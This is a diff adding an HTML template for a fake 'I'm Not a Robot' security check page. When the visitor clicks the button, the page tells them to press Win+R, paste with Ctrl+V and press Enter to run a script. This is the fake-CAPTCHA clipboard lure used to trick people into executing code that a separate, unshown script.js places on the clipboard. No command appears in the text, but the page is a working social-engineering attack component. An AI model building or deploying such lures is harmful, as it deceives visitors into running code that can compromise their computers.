@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>I'm Not a Robot</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+</head>
+<body>
+    <div class="captcha-wrapper">
+        <div class="captcha-box">
+            <h1>Security Verification</h1>
+            <p>To prove you're not a robot, please solve this challenge.</p>
+            <button id="captchaButton" class="captcha-button">I'm Not a Robot</button>
+        </div>
+
+        <div id="stepsContainer" class="steps-container" style="display: none;">
+            <h2>Verification Steps:</h2>
+            <p>Please follow these steps:</p>
+            <ol>
+                <li>Press <strong>Win + R</strong> to open the Run dialog.</li>
+                <li>Press <strong>Ctrl + V</strong> to paste the code.</li>
+                <li>Press <strong>Enter</strong> to run the script.</li>
+            </ol>
+            <button id="executeButton" class="execute-button">Execute Script</button>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+</body>
+</html>
